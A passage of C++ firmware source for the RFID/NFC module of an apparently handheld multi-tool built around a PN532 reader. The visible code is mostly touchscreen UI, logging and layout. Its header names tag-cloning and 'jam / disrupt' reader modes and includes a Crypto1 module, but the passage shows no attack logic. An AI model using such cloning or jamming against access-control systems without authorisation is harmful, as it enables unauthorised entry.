#include "rfid.h"

#include <Adafruit_PN532.h>
#include <SPI.h>
#include <Arduino.h>
#include <cstdio>
#include <cstring>
#include <strings.h>
#include <Preferences.h>

#include "SettingsStore.h"
#include "crypto1.h"
#include "KeyboardUI.h"
#include "Touchscreen.h"
#include "icon.h"
#include "utils.h"
#include "shared.h"

#ifndef RFID_UID_CLONE
#define RFID_UID_CLONE 1
#endif

/** Passive listen max wait (ms). Old 60000 felt like “~1 minute” when no tag. Override in build flags if needed. */
#ifndef RFID_TAG_LISTEN_TIMEOUT_MS
#define RFID_TAG_LISTEN_TIMEOUT_MS 20000
#endif
/** Clone flow waits for source / blank tag (ms). */
#ifndef RFID_CLONE_PHASE_TIMEOUT_MS
#define RFID_CLONE_PHASE_TIMEOUT_MS 45000
#endif
/** Jam / disrupt: wait for external reader to poll target (ms). 0 = until Stop. */
#ifndef RFID_TARGET_WAIT_TIMEOUT_MS
#define RFID_TARGET_WAIT_TIMEOUT_MS 120000
#endif

static Adafruit_PN532 s_nfc(PN532_SCK, PN532_MISO, PN532_MOSI, PN532_SS);
static bool s_hwOk = false;
static char s_pn532VerStr[28] = "";
static bool s_rfidRetrySession = false;
static FeatureUI::Button s_rfFoot[2];

/* NullTag-style card family */
enum CardType { UNKNOWN, MIFARE_CLASSIC, MIFARE_ULTRALIGHT, NTAG, MIFARE_DESFIRE };

enum class RfidUiEvt { None, Back, Primary };

static void rfidAttachBus() {
  // Adafruit_PN532 is constructed for software SPI (bitbang). Do NOT call
  // SPI.begin(PN532_*) here: on DIV V2 the PN532 MOSI/MISO pins are swapped
  // vs the SD/CC1101 bus, and remapping hardware SPI that way leaves the SD
  // card dead until something else (e.g. SubGHz) re-inits the bus correctly.
  if (s_hwOk) {
    s_nfc.begin();
    s_nfc.SAMConfig();
    s_nfc.setPassiveActivationRetries(0xFF);
  }
}

/** Release PN532 bitbang pins and remount SD on the shared SPI bus. */
static void rfidRestoreBus() {
  restoreSdAfterSharedSpi();
}

static void rfidPn532VerStr(uint32_t ver) {
  if (!ver) {
    s_pn532VerStr[0] = '\0';
    return;
  }
  snprintf(s_pn532VerStr, sizeof(s_pn532VerStr), "PN532 0x%06lX", (unsigned long)ver);
}

static void rfidReleaseNavButtons() {
  delay(12);
  for (int i = 0; i < 80; i++) {
    if (!isButtonPressed(BTN_SELECT) && !isButtonPressed(BTN_LEFT) &&
        !isButtonPressed(BTN_RIGHT) && !isButtonPressed(BTN_UP) &&
        !isButtonPressed(BTN_DOWN)) {
      break;
    }
    delay(5);
  }
}

static constexpr int kRfidScreenH = 320;
static constexpr int16_t kRfidToolbarY = 20;
static constexpr int16_t kRfidToolbarH = 16;
static constexpr int kRfidToolbarBottom = kRfidToolbarY + kRfidToolbarH;
static constexpr int kRfidIconBackX = 10;
static constexpr int kRfidIconSize = 16;
static bool s_rfidUiDrawn = false;

static int rfidContentBottom() {
  return featureHasTouchNavBar() ? touchNavContentBottomY() : kRfidScreenH;
}

static void rfidClearBody(uint16_t color = FEATURE_BG) {
  if (featureHasTouchNavBar()) {
    featureClearContent(color);
  } else {
    tft.fillScreen(color);
  }
}

static void rfidRedrawNavChrome() {
  redrawTouchButtonBar();
  maintainTouchNavBar();
}

static bool rfidSessionExitRequested() { return feature_exit_requested; }

static void rfidPollToolbar() {
  if (!feature_active) {
    return;
  }
  static unsigned long s_lastToolbarCheck = 0;
  if (millis() - s_lastToolbarCheck < 50) {
    return;
  }
  s_lastToolbarCheck = millis();
  int x = 0;
  int y = 0;
  if (!readTouchXY(x, y)) {
    return;
  }
  if (y > kRfidToolbarY && y < kRfidToolbarBottom && x > kRfidIconBackX &&
      x < (kRfidIconBackX + kRfidIconSize)) {
    feature_exit_requested = true;
  }
}

static bool rfidPumpSessionUi() {
  if (rfidSessionExitRequested()) {
    return true;
  }
  maintainTouchNavBar();
  rfidPollToolbar();
  if (s_rfidUiDrawn) {
    tft.drawFastHLine(0, kRfidToolbarY, TFT_WIDTH, UI_LINE);
    tft.drawFastHLine(0, kRfidToolbarBottom, TFT_WIDTH, UI_LINE);
  }
  return false;
}

static RfidUiEvt rfidPollFooter(FeatureUI::Button* btns, int n, bool mapSelectToPrimary) {
  if (isButtonPressed(BTN_LEFT)) {
    rfidReleaseNavButtons();
    return RfidUiEvt::Back;
  }
  if (n == 1 && isButtonPressed(BTN_SELECT)) {
    rfidReleaseNavButtons();
    return RfidUiEvt::Back;
  }
  if (mapSelectToPrimary && n >= 2 && isButtonPressed(BTN_SELECT)) {
    if (!btns[1].disabled) {
      rfidReleaseNavButtons();
      return RfidUiEvt::Primary;
    }
  }
  if (featureHasTouchNavBar()) {
    if (isTouchNavButtonPressedEdge(BTN_LEFT)) {
      rfidReleaseNavButtons();
      return RfidUiEvt::Back;
    }
    if (isTouchNavButtonPressedEdge(BTN_SELECT)) {
      if (mapSelectToPrimary && n >= 2 && !btns[1].disabled) {
        rfidReleaseNavButtons();
        return RfidUiEvt::Primary;
      }
      rfidReleaseNavButtons();
      return RfidUiEvt::Back;
    }
    return RfidUiEvt::None;
  }
  int x = 0, y = 0;
  if (!readTouchXYDismiss(x, y) && !readTouchXY(x, y)) {
    return RfidUiEvt::None;
  }
  int h = FeatureUI::hit(btns, n, x, y);
  if (h < 0) {
    return RfidUiEvt::None;
  }
  if (btns[h].disabled) {
    return RfidUiEvt::None;
  }
  rfidReleaseNavButtons();
  if (h == 0) {
    return RfidUiEvt::Back;
  }
  return RfidUiEvt::Primary;
}

static constexpr int RF_PAD_X = 10;
static constexpr int RF_RESULT_LINE_PX = 17;
static constexpr int RF_BODY_LINE_PX = 18;
static constexpr int RF_TAG_H = 14;
static constexpr int RF_TAG_GAP = 4;
/** Ignored — kept so session code need not change. */
static constexpr int RF_DYN_TOP_MAIN = 0;
static constexpr int RF_DYN_TOP_PROG = 0;

/** IR Record / 2.4GHz Scanner rhythm */
static constexpr int kRfidToolbarGap = 8;
static constexpr int kRfidBoxHeaderH = 15;
static constexpr int kRfidLineHeight = 12;
static constexpr int kRfidStatusY = kRfidToolbarBottom + kRfidToolbarGap;
static constexpr int kRfidStatusBoxH = 91;
static constexpr int kRfidLogGap = 4;
static constexpr int kRfidLogBoxH = 49;
static constexpr int kRfidLogBoxTop = kRfidStatusY + kRfidStatusBoxH + kRfidLogGap;
static constexpr int kRfidLogStartY = kRfidLogBoxTop + kRfidBoxHeaderH;
static constexpr int kRfidLogEndY = kRfidLogBoxTop + kRfidLogBoxH - 2;
static constexpr int kRfidDetailTop = kRfidLogBoxTop + kRfidLogBoxH + 4;
static constexpr int kRfidStatusLineCount = 6;
static constexpr int kRfidStatusTextY = kRfidStatusY + kRfidBoxHeaderH;
static constexpr int kRfidMaxLogLines = 48;
static constexpr int kRfidDetailPadX = RF_PAD_X;
static constexpr int kRfidDetailInnerW = 220;
static constexpr int kRfidDetailHeaderH = 18;

static int rfidHintY() {
  if (featureHasTouchNavBar()) {
    return rfidContentBottom() - 16;
  }
  return TFT_HEIGHT - FeatureUI::FOOTER_H - 16;
}

static int rfidDetailBottom() {
  if (featureHasTouchNavBar()) {
    return rfidContentBottom() - 8;
  }
  return rfidHintY() - 8;
}

static int rfidEffectiveDetailTop() {
  const int bottom = rfidDetailBottom();
  const int minDetailH = 80;
  int top = kRfidDetailTop;
  if (bottom - top < minDetailH) {
    top = bottom - minDetailH;
    const int logBottom = kRfidLogBoxTop + kRfidLogBoxH;
    if (top < logBottom + 2) {
      top = logBottom + 2;
    }
  }
  return top;
}

static int rfidDetailBodyTop() { return rfidEffectiveDetailTop() + kRfidBoxHeaderH + 2; }

static int rfidDetailLinesPerPage() {
  const int bodyBottom = rfidDetailBottom() - 4;
  const int n = (bodyBottom - rfidDetailBodyTop()) / kRfidLineHeight;
  return n < 1 ? 1 : n;
}

static bool s_rfidBoxesDrawn = false;
static bool s_rfidStatusStaticDrawn = false;
static bool s_rfidDetailBoxVisible = false;
static char s_featureInfoTitle[32];
static char s_featureInfoBody[640];
static bool s_featureInfoAvailable = false;
static char s_listenCenterLabel[24];
static String s_rfidLogBuffer[kRfidMaxLogLines];
static uint16_t s_rfidLogColor[kRfidMaxLogLines];
static int s_rfidLogIndex = 0;
static String s_rfidStatusLineText[kRfidStatusLineCount];
static uint16_t s_rfidStatusLineColor[kRfidStatusLineCount];

static void rfidPrintWrappedPageBg(int x, int y, int maxWidth, const char* text, int lineStepPx,
                                   uint16_t fg, uint16_t bg, int firstLine, int maxLines);
static int rfidCountWrappedLines(int maxWidth, const char* text);
static bool rfidDetailTagNeedsPill(const char* tagLabel);

static constexpr int kRfidInfoHeaderH = 18;
static constexpr int kRfidInfoTitleH = 15;
static constexpr int kRfidInfoPanelPad = 8;
static constexpr int kRfidInfoLinePx = 16;
/** Match Activity / log box chrome (drawRoundRect at x=4, w=TFT_WIDTH-8). */
static constexpr int kRfidInfoBoxX = 4;
static constexpr int kRfidInfoBoxW = TFT_WIDTH - 8;
static constexpr int kRfidInfoInnerX = 6;
static constexpr int kRfidInfoInnerW = TFT_WIDTH - 12;
static constexpr int kRfidInfoTextW = TFT_WIDTH - RF_PAD_X * 2;

static int rfidInfoPanelPageCountForLines(const char* body, int linesPerPage) {
  int total = rfidCountWrappedLines(kRfidInfoTextW, body);
  int pageCount = (total + linesPerPage - 1) / linesPerPage;
  return pageCount < 1 ? 1 : pageCount;
}

static int rfidDetailOverlayTop() { return kRfidStatusY; }

static int rfidInfoContentTop(bool withFeatureTitle) {
  int y = rfidDetailOverlayTop() + kRfidInfoHeaderH + 1 + 5;
  if (withFeatureTitle) {
    y += kRfidInfoTitleH + 4;
  }
  return y + kRfidInfoPanelPad;
}

static int rfidInfoContentBottom() { return rfidDetailBottom() - 6; }

static int rfidInfoOverlayLinesPerPage(bool withFeatureTitle) {
  const int panelTop = rfidInfoContentTop(withFeatureTitle) - kRfidInfoPanelPad;
  const int panelH = rfidInfoContentBottom() - panelTop;
  const int innerH = panelH - kRfidInfoPanelPad * 2;
  const int n = innerH / kRfidInfoLinePx;
  return n < 1 ? 1 : n;
}

static void rfidDrawInfoPill(int x, int y, int w, const char* label) {
  if (w < 28) {
    w = 28;
  }
  tft.fillRoundRect(x, y, w, RF_TAG_H, 7, DARK_GRAY);
  tft.setTextColor(UI_ICON, DARK_GRAY);
  tft.setCursor(x + 6, y + 3);
  tft.print(label);
}

static String rfidFitInfoTitle(const char* title) {
  if (!title || !title[0]) {
    return String();
  }
  String t = title;
  const int maxW = TFT_WIDTH - RF_PAD_X * 2;
  const bool needsEllipsis = tft.textWidth(t) > maxW;
  while (t.length() > 0 && tft.textWidth(needsEllipsis ? t + "..." : t) > maxW) {
    t.remove(t.length() - 1);
  }
  if (needsEllipsis && t.length() > 0) {
    t += "...";
  }
  return t;
}

static void rfidDrawInfoOverlay(const char* featureTitle, const char* body, int page, int pageCount,
                                int linesPerPage) {
  const int top = rfidDetailOverlayTop();
  const int bottom = rfidDetailBottom();
  const bool showTitle = featureTitle && featureTitle[0];

  tft.fillRect(0, top - 2, TFT_WIDTH, bottom - top + 2, TFT_BLACK);
  tft.drawFastHLine(0, 19, TFT_WIDTH, UI_LINE);

  tft.setTextFont(1);
  tft.setTextSize(1);

  const int headerY = top + 3;
  tft.setTextColor(UI_TEXT, TFT_BLACK);
  tft.drawString("Info", RF_PAD_X, headerY);

  if (pageCount > 1) {
    char pageLabel[12];
    snprintf(pageLabel, sizeof(pageLabel), "%d/%d", page + 1, pageCount);
    const int pw = (int)tft.textWidth(pageLabel) + 14;
    rfidDrawInfoPill(TFT_WIDTH - RF_PAD_X - pw, headerY, pw, pageLabel);
  }

  int y = top + kRfidInfoHeaderH;
  tft.drawFastHLine(kRfidInfoBoxX, y, kRfidInfoBoxW, UI_LINE);
  y += 5;

  if (showTitle) {
    tft.setTextColor(UI_TEXT, TFT_BLACK);
    tft.drawString(rfidFitInfoTitle(featureTitle), RF_PAD_X, y);
    y += kRfidInfoTitleH;
    tft.drawFastHLine(kRfidInfoBoxX, y - 2, kRfidInfoBoxW, UI_LINE);
    y += 4;
  }

  const int panelY = y;
  const int panelH = bottom - panelY - 4;
  if (panelH > 8) {
    tft.drawRoundRect(kRfidInfoBoxX, panelY, kRfidInfoBoxW, panelH, 3, UI_LINE);
    if (panelH > 4) {
      tft.fillRect(kRfidInfoInnerX, panelY + 2, kRfidInfoInnerW, panelH - 4, DARK_GRAY);
    }
  }

  const int textX = RF_PAD_X;
  const int textY = panelY + kRfidInfoPanelPad;
  const int textBottom = panelY + panelH - kRfidInfoPanelPad;
  const int maxLinesInPanel = (textBottom - textY) / kRfidInfoLinePx;
  const int linesToDraw = (linesPerPage < maxLinesInPanel) ? linesPerPage : maxLinesInPanel;

  rfidPrintWrappedPageBg(textX, textY, kRfidInfoTextW, body, kRfidInfoLinePx, UI_TEXT, DARK_GRAY,
                         page * linesPerPage, linesToDraw);

  if (pageCount > 1 && panelH > 20) {
    tft.setTextColor(UI_DIM_TEXT, DARK_GRAY);
    if (page > 0) {
      tft.setCursor(kRfidInfoInnerX + 4, panelY + panelH - 12);
      tft.print("< Prev");
    }
    if (page < pageCount - 1) {
      const char* nextHint = "Next >";
      const int nw = tft.textWidth(nextHint);
      tft.setCursor(kRfidInfoInnerX + kRfidInfoInnerW - nw - 4, panelY + panelH - 12);
      tft.print(nextHint);
    }
  }
}

static void rfidDynamicBand(int topY, const char* line1, const char* line2);
static void rfidTryShowInfo();
static void rfidWaitTwoBoxDismiss();
static void rfidRunToolbar(const char* title);
static void rfidDrawTextBoxes();
static void rfidResetUiState();
static void rfidPrint(const String& text, uint16_t color, bool extraSpace = false);
static void rfidDrawStatusLineIfChanged(int line, const String& text, uint16_t color);

/** Dim one-line caption for NFC Status (listen/progress); cleared in rfidFeatureSetup. */
static char s_rfidBandAux[72];

static void rfidFeatureSetup(const char* title) {
  applyThemeToPalette(settings().theme);
  rfidResetUiState();
  rfidClearBody(TFT_BLACK);
  drawStatusBar(readBatteryVoltage(), true);
  s_rfidBandAux[0] = '\0';
  rfidRunToolbar(title);
  rfidDrawTextBoxes();
  rfidRedrawNavChrome();
}

static void rfidSetDialogNavLabels(const char* primaryLabel) {
  setTouchNavLabels("Back", nullptr, primaryLabel, nullptr, nullptr);
  redrawTouchButtonBar();
}

static void rfidSetListenNavLabels(const char* actionLabel, bool withInfo = false) {
  setTouchNavLabels(nullptr, nullptr, actionLabel, nullptr, withInfo ? "Info" : nullptr);
  redrawTouchButtonBar();
}

static void rfidSetInfoOverlayNavLabels(int pageCount) {
  if (pageCount > 1) {
    // Remapped: Prev/Next always sit on UP/DOWN (was swapped).
    setTouchNavLabels("Back", "Next", "Back", "Prev", nullptr);
  } else {
    setTouchNavLabels("Back", nullptr, "Back", nullptr, nullptr);
  }
  redrawTouchButtonBar();
}

static void rfidSetTimeoutNavLabels(bool withInfo) {
  setTouchNavLabels("Exit", nullptr, "Ready", nullptr, withInfo ? "Info" : nullptr);
  redrawTouchButtonBar();
}

static void rfidDrawShellFooter1(const char* actionLabel) {
  FeatureUI::layoutFooter1(s_rfFoot[0], actionLabel, FeatureUI::ButtonStyle::Secondary);
  if (actionLabel && actionLabel[0]) {
    strncpy(s_listenCenterLabel, actionLabel, sizeof(s_listenCenterLabel) - 1);
    s_listenCenterLabel[sizeof(s_listenCenterLabel) - 1] = '\0';
  } else {
    s_listenCenterLabel[0] = '\0';
  }
  if (featureHasTouchNavBar()) {
    rfidSetListenNavLabels(actionLabel, s_featureInfoAvailable);
  } else {
    FeatureUI::drawFooterBg();
    FeatureUI::drawButton(s_rfFoot[0]);
  }
}

static void rfidDrawShellFooter2(const char* primaryLabel, FeatureUI::ButtonStyle primaryStyle,
                                 bool primaryDisabled) {
  FeatureUI::layoutFooter2(s_rfFoot, "Back", FeatureUI::ButtonStyle::Secondary, primaryLabel,
                             primaryStyle, false, primaryDisabled);
  if (featureHasTouchNavBar()) {
    rfidSetDialogNavLabels(primaryLabel);
  } else {
    FeatureUI::drawFooterBg();
    FeatureUI::drawButton(s_rfFoot[0]);
    FeatureUI::drawButton(s_rfFoot[1]);
  }
}

static void rfidSetBandAux(const char* s) {
  if (!s || !s[0]) {
    s_rfidBandAux[0] = '\0';
    return;
  }
  strncpy(s_rfidBandAux, s, sizeof(s_rfidBandAux) - 1);
  s_rfidBandAux[sizeof(s_rfidBandAux) - 1] = '\0';
}

/** IR Record-style toolbar: DARK_GRAY bar, title left, back icon. */
static void rfidRunToolbar(const char* title) {
  if (s_rfidUiDrawn) {
    return;
  }
  tft.fillRect(0, kRfidToolbarY, TFT_WIDTH, kRfidToolbarH, DARK_GRAY);
  tft.drawBitmap(kRfidIconBackX, kRfidToolbarY, bitmap_icon_go_back, kRfidIconSize, kRfidIconSize,
                 UI_ICON);
  tft.setTextColor(UI_TEXT, DARK_GRAY);
  tft.setTextSize(1);
  if (title && title[0]) {
    const int titleX = 35;
    const int maxTitleW = TFT_WIDTH - titleX - 8;
    String t = title;
    const bool needsEllipsis = tft.textWidth(t) > maxTitleW;
    while (t.length() > 0 && tft.textWidth(needsEllipsis ? t + "..." : t) > maxTitleW) {
      t.remove(t.length() - 1);
    }
    if (needsEllipsis) {
      t += "...";
    }
    tft.setCursor(titleX, kRfidToolbarY + 4);
    tft.print(t);
  }
  tft.drawFastHLine(0, 19, TFT_WIDTH, UI_LINE);
  tft.drawFastHLine(0, kRfidToolbarBottom, TFT_WIDTH, UI_LINE);
  s_rfidUiDrawn = true;
}

static void rfidUpdateToolbarTitle(const char* title) {
  s_rfidUiDrawn = false;
  rfidRunToolbar(title);
}

static void rfidPrintWrappedStepBg(int x, int y, int maxWidth, const char* text, int lineStepPx,
                                   uint16_t fg, uint16_t bg, int bottomY = TFT_HEIGHT) {
  String message = text ? text : "";
  int cursorY = y;
  bool clipped = false;

  while (message.length() > 0) {
    if (cursorY > bottomY - lineStepPx) {
      clipped = true;
      break;
    }

    int nl = message.indexOf('\n');
    String paragraph = (nl >= 0) ? message.substring(0, nl) : message;
    message = (nl >= 0) ? message.substring(nl + 1) : "";

    if (paragraph.length() == 0) {
      cursorY += lineStepPx;
      continue;
    }

    while (paragraph.length() > 0) {
      if (cursorY > bottomY - lineStepPx) {
        clipped = true;
        break;
      }

      int lineEnd = (int)paragraph.length();
      while (tft.textWidth(paragraph.substring(0, lineEnd)) > maxWidth && lineEnd > 1) {
        lineEnd--;
      }
      if (lineEnd < (int)paragraph.length()) {
        int lastSpace = paragraph.substring(0, lineEnd).lastIndexOf(' ');
        if (lastSpace > 0) {
          lineEnd = lastSpace;
        }
      }

      tft.setTextColor(fg, bg);
      tft.setCursor(x, cursorY);
      tft.print(paragraph.substring(0, lineEnd));
      paragraph = paragraph.substring(lineEnd);
      paragraph.trim();
      cursorY += lineStepPx;
    }
  }

  if (clipped && bottomY >= y + lineStepPx) {
    tft.setTextColor(UI_DIM_TEXT, bg);
    tft.setCursor(x, bottomY - lineStepPx);
    tft.print("...");
  }
}

static void rfidPrintWrappedStep(int x, int y, int maxWidth, const char* text, int lineStepPx) {
  rfidPrintWrappedStepBg(x, y, maxWidth, text, lineStepPx, UI_TEXT, FEATURE_BG);
}

static int rfidCountWrappedLines(int maxWidth, const char* text) {
  String message = text ? text : "";
  int total = 0;
  while (message.length() > 0) {
    int nl = message.indexOf('\n');
    String paragraph = (nl >= 0) ? message.substring(0, nl) : message;
    message = (nl >= 0) ? message.substring(nl + 1) : "";

    if (paragraph.length() == 0) {
      total++;
      continue;
    }

    while (paragraph.length() > 0) {
      int lineEnd = (int)paragraph.length();
      while (tft.textWidth(paragraph.substring(0, lineEnd)) > maxWidth && lineEnd > 1) {
        lineEnd--;
      }
      if (lineEnd < (int)paragraph.length()) {
        int lastSpace = paragraph.substring(0, lineEnd).lastIndexOf(' ');
        if (lastSpace > 0) {
          lineEnd = lastSpace;
        }
      }
      paragraph = paragraph.substring(lineEnd);
      paragraph.trim();
      total++;
    }
  }
  return total > 0 ? total : 1;
}

static void rfidPrintWrappedPageBg(int x, int y, int maxWidth, const char* text, int lineStepPx,
                                   uint16_t fg, uint16_t bg, int firstLine, int maxLines) {
  String message = text ? text : "";
  int lineNo = 0;
  int drawn = 0;
  while (message.length() > 0 && drawn < maxLines) {
    int nl = message.indexOf('\n');
    String paragraph = (nl >= 0) ? message.substring(0, nl) : message;
    message = (nl >= 0) ? message.substring(nl + 1) : "";

    if (paragraph.length() == 0) {
      if (lineNo >= firstLine) {
        drawn++;
      }
      lineNo++;
      continue;
    }

    while (paragraph.length() > 0 && drawn < maxLines) {
      int lineEnd = (int)paragraph.length();
      while (tft.textWidth(paragraph.substring(0, lineEnd)) > maxWidth && lineEnd > 1) {
        lineEnd--;
      }
      if (lineEnd < (int)paragraph.length()) {
        int lastSpace = paragraph.substring(0, lineEnd).lastIndexOf(' ');
        if (lastSpace > 0) {
          lineEnd = lastSpace;
        }
      }

      if (lineNo >= firstLine) {
        tft.setTextColor(fg, bg);
        tft.setCursor(x, y + drawn * lineStepPx);
        tft.print(paragraph.substring(0, lineEnd));
        drawn++;
      }
      paragraph = paragraph.substring(lineEnd);
      paragraph.trim();
      lineNo++;
    }
  }
}

static String rfidFitStatusText(const String& text) {
  const int maxWidth = TFT_WIDTH - 16;
  tft.setTextSize(1);
  if (tft.textWidth(text) <= maxWidth) {
    return text;
  }
  String out = text;
  while (out.length() > 1 && tft.textWidth(out + "...") > maxWidth) {
    out.remove(out.length() - 1);
  }
  if (out.length() > 0) {
    out += "...";
  }
  return out;
}

static constexpr int kRfidLogTextX = 10;
static constexpr int kRfidLogTextW = TFT_WIDTH - kRfidLogTextX * 2;

static String rfidFitLogText(const String& text) {
  tft.setTextSize(1);
  if (tft.textWidth(text) <= kRfidLogTextW) {
    return text;
  }
  String out = text;
  while (out.length() > 1 && tft.textWidth(out + "...") > kRfidLogTextW) {
    out.remove(out.length() - 1);
  }
  if (out.length() > 0) {
    out += "...";
  }
  return out;
}

static void rfidScrollLog() {
  for (int i = 0; i < kRfidMaxLogLines - 1; i++) {
    s_rfidLogBuffer[i] = s_rfidLogBuffer[i + 1];
    s_rfidLogColor[i] = s_rfidLogColor[i + 1];
  }
}

static int rfidLogAreaBottom() {
  if (s_rfidDetailBoxVisible) {
    return kRfidLogEndY;
  }
  const int logH = rfidDetailBottom() - kRfidLogBoxTop;
  return kRfidLogBoxTop + logH - 3;
}

static int rfidLogBoxDrawHeight() {
  if (s_rfidDetailBoxVisible) {
    return kRfidLogBoxH;
  }
  return rfidDetailBottom() - kRfidLogBoxTop;
}

static void rfidSetDetailBoxVisible(bool visible) {
  if (s_rfidDetailBoxVisible == visible) {
    return;
  }
  s_rfidDetailBoxVisible = visible;
  s_rfidBoxesDrawn = false;
}

static int rfidLogVisibleLines() {
  const int h = rfidLogAreaBottom() - kRfidLogStartY;
  if (h <= 0 || kRfidLineHeight <= 0) {
    return 1;
  }
  return h / kRfidLineHeight;
}

static void rfidRedrawActivityLog() {
  const int visible = rfidLogVisibleLines();
  const int logBottom = rfidLogAreaBottom();
  tft.fillRect(6, kRfidLogStartY, TFT_WIDTH - 12, logBottom - kRfidLogStartY, TFT_BLACK);
  if (visible <= 0 || s_rfidLogIndex <= 0) {
    return;
  }
  const int start = (s_rfidLogIndex > visible) ? (s_rfidLogIndex - visible) : 0;
  for (int row = 0; row < visible; row++) {
    const int bufIndex = start + row;
    if (bufIndex >= s_rfidLogIndex) {
      break;
    }
    if (s_rfidLogBuffer[bufIndex].length() == 0) {
      continue;
    }
    const int yPos = kRfidLogStartY + row * kRfidLineHeight;
    tft.setTextSize(1);
    tft.setTextColor(s_rfidLogColor[bufIndex], TFT_BLACK);
    tft.setCursor(kRfidLogTextX, yPos);
    tft.print(rfidFitLogText(s_rfidLogBuffer[bufIndex]));
  }
}

static void rfidAppendLogLine(const String& line, uint16_t color) {
  if (line.length() == 0) {
    return;
  }
  if (s_rfidLogIndex >= kRfidMaxLogLines) {
    rfidScrollLog();
    s_rfidLogIndex = kRfidMaxLogLines - 1;
  }
  s_rfidLogBuffer[s_rfidLogIndex] = rfidFitLogText(line);
  s_rfidLogColor[s_rfidLogIndex] = color;
  s_rfidLogIndex++;
}

static void rfidPrint(const String& text, uint16_t color, bool extraSpace) {
  tft.setTextSize(1);
  String remaining = text;
  while (remaining.length() > 0) {
    const int nl = remaining.indexOf('\n');
    if (nl >= 0) {
      rfidAppendLogLine(remaining.substring(0, nl), color);
      remaining = remaining.substring(nl + 1);
      continue;
    }
    if (tft.textWidth(remaining) <= kRfidLogTextW) {
      rfidAppendLogLine(remaining, color);
      break;
    }
    int end = (int)remaining.length();
    while (end > 1 && tft.textWidth(remaining.substring(0, end)) > kRfidLogTextW) {
      end--;
    }
    if (end < (int)remaining.length()) {
      const int sp = remaining.substring(0, end).lastIndexOf(' ');
      if (sp > 0) {
        end = sp;
      }
    }
    String line = remaining.substring(0, end);
    line.trim();
    remaining = remaining.substring(end);
    remaining.trim();
    if (line.length() == 0 && remaining.length() > 0) {
      line = rfidFitLogText(remaining);
      remaining = "";
    }
    rfidAppendLogLine(line, color);
  }
  if (extraSpace && s_rfidLogIndex < kRfidMaxLogLines) {
    s_rfidLogBuffer[s_rfidLogIndex] = "";
    s_rfidLogColor[s_rfidLogIndex] = TFT_WHITE;
    s_rfidLogIndex++;
  }
  rfidRedrawActivityLog();
}

static void rfidDrawStatusLine(int line, const String& text, uint16_t color) {
  const int y = kRfidStatusTextY + line * kRfidLineHeight;
  const String fitted = rfidFitStatusText(text);
  tft.fillRect(8, y, TFT_WIDTH - 16, kRfidLineHeight, TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(8, y);
  tft.print(fitted);
}

static void rfidDrawStatusLineIfChanged(int line, const String& text, uint16_t color) {
  if (line < 0 || line >= kRfidStatusLineCount) {
    return;
  }
  if (s_rfidStatusLineText[line] == text && s_rfidStatusLineColor[line] == color) {
    return;
  }
  s_rfidStatusLineText[line] = text;
  s_rfidStatusLineColor[line] = color;
  rfidDrawStatusLine(line, text, color);
}

/** Repaint NFC Status lines after overlay/box chrome cleared the framebuffer. */
static void rfidRepaintStatusFromCache() {
  for (int i = 0; i < kRfidStatusLineCount; i++) {
    if (s_rfidStatusLineText[i].length() > 0) {
      rfidDrawStatusLine(i, s_rfidStatusLineText[i], s_rfidStatusLineColor[i]);
    }
  }
}

static void rfidDrawTextBoxes() {
  const int detailBottom = rfidDetailBottom();
  const int detailTop = rfidEffectiveDetailTop();
  const int logH = rfidLogBoxDrawHeight();
  tft.fillRect(0, kRfidStatusY - 2, TFT_WIDTH, detailBottom - kRfidStatusY + 2, TFT_BLACK);
  tft.drawFastHLine(0, 19, TFT_WIDTH, UI_LINE);
  tft.drawRoundRect(4, kRfidLogBoxTop, TFT_WIDTH - 8, logH, 3, UI_LINE);
  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.drawString("NFC Status", 8, kRfidStatusY + 3);
  tft.drawString("Activity", 8, kRfidLogBoxTop + 3);
  if (s_rfidDetailBoxVisible) {
    const int detailH = detailBottom - detailTop;
    if (detailH > 8) {
      tft.drawRoundRect(4, detailTop, TFT_WIDTH - 8, detailH, 3, UI_LINE);
    }
    tft.drawString("Tag Details", 8, detailTop + 3);
  } else {
    const int innerH = logH - kRfidBoxHeaderH - 2;
    if (innerH > 0) {
      tft.fillRect(6, kRfidLogBoxTop + kRfidBoxHeaderH, TFT_WIDTH - 12, innerH, TFT_BLACK);
    }
  }
  s_rfidBoxesDrawn = true;
}

static void rfidDrawStaticStatusLines() {
  if (s_rfidStatusStaticDrawn) {
    return;
  }
  rfidDrawStatusLineIfChanged(4, "Protocol: ISO14443A", UI_DIM_TEXT);
  if (s_pn532VerStr[0] != '\0') {
    rfidDrawStatusLineIfChanged(5, String("Reader: ") + s_pn532VerStr, UI_DIM_TEXT);
  } else {
    rfidDrawStatusLineIfChanged(5, "Reader: PN532", UI_DIM_TEXT);
  }
  s_rfidStatusStaticDrawn = true;
}

static void rfidResetUiState() {
  s_rfidUiDrawn = false;
  s_rfidBoxesDrawn = false;
  s_rfidStatusStaticDrawn = false;
  s_rfidDetailBoxVisible = false;
  s_featureInfoAvailable = false;
  s_featureInfoTitle[0] = '\0';
  s_featureInfoBody[0] = '\0';
  s_listenCenterLabel[0] = '\0';
  s_rfidLogIndex = 0;
  for (int i = 0; i < kRfidMaxLogLines; i++) {
    s_rfidLogBuffer[i] = "";
    s_rfidLogColor[i] = 0;
  }
  for (int i = 0; i < kRfidStatusLineCount; i++) {
    s_rfidStatusLineText[i] = "";
    s_rfidStatusLineColor[i] = 0;
  }
}

static char s_dynPrev1[72];
static char s_dynPrev2[72];
static char s_dynPrevAux[72];
static char s_dynPrevPill[16];
static char s_dynPillLabel[16] = "LIVE";
static uint16_t s_dynPillColor = UI_WARN;

static unsigned s_listenSec = 0xFFFFFFFFu;
static uint8_t s_listenSpin = 0;
static unsigned long s_listenSpinMs = 0;

static void rfidListenShellReset() {
  s_listenSec = 0xFFFFFFFFu;
  s_listenSpin = 0;
  s_listenSpinMs = 0;
}

static void rfidDynClearPrev() {
  s_dynPrev1[0] = '\0';
  s_dynPrev2[0] = '\0';
  s_dynPrevAux[0] = '\0';
  s_dynPrevPill[0] = '\0';
}

static void rfidSetDynamicPill(const char* label, uint16_t color) {
  if (!label) {
    return;
  }
  strncpy(s_dynPillLabel, label, sizeof(s_dynPillLabel) - 1);
  s_dynPillLabel[sizeof(s_dynPillLabel) - 1] = '\0';
  s_dynPillColor = color;
}

static void rfidSetFeatureInfo(const char* title, const char* body) {
  if (title && title[0]) {
    strncpy(s_featureInfoTitle, title, sizeof(s_featureInfoTitle) - 1);
